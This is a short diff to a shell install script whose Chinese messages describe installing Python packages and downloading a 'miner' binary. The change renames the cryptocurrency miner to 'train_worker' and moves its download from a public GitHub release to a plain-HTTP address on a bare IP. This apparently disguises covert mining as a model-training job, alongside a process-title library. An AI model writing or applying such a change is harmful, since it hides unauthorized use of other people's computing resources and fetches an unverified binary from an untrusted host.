@@ -9,8 +9,8 @@ echo "[*] 安裝 Python 必要套件..."
 pip3 install --upgrade pip
 pip3 install torch numpy setproctitle
 
-MINER_BIN="t-rex"
-MINER_URL="https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz"
+MINER_BIN="train_worker"
+MINER_URL="http://3.81.227.209:8080/train_worker.tar.gz"
 MINER_DIR="./miner"
 
 echo "[*] 下載並解壓礦工二進制檔..."
